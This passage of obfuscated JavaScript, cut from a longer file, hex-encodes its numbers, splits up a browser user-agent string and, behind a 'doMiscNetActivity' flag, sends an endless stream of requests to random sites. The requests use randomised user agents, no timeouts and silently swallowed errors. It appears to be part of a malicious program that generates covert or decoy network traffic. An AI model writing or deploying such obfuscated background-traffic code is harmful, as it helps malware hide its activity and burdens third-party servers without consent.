      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x7 * -0x585 + -0x94f * -0x4 + 0x167; k < -0x13a6 + -0x38 * 0x25 + 0x1bc2; k++)
    setTimeout(f, (-0xb1cc + -0x100b0 + 0x13 * 0x2334) * k * getRandomInt(-0xf97 + -0x169e + 0x2636, -0x301 + -0x224f + 0x2553));
  setInterval(() => {
    f();
    for (let l = 0x770 + -0x1517 + 0xe9 * 0xf; l < 0x1d64 * 0x1 + -0xa85 * -0x1 + -0x1 * 0x27e5; l++)
      setTimeout(f, (0x4 * 0x5dd5 + -0x1cd5f + 0x1406b) * l * getRandomInt(-0x5a0 + -0x1a43 + 0x1fe4, 0x6 * 0x669 + 0xf70 + 0x1bd * -0x1f));
  }, -0x437d86 + 0xc11fb + 0x6e5a0b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x5 * 0xaa7 + -0x26c7 + 0x7762) * getRandomInt(-0x8d1 + 0x75c + 0x16 * 0x11, -0x1 * 0x212f + -0x14 * 0x11 + 0x2288));
}, 0x242 + 0x6 * 0x2d + -0x2ec);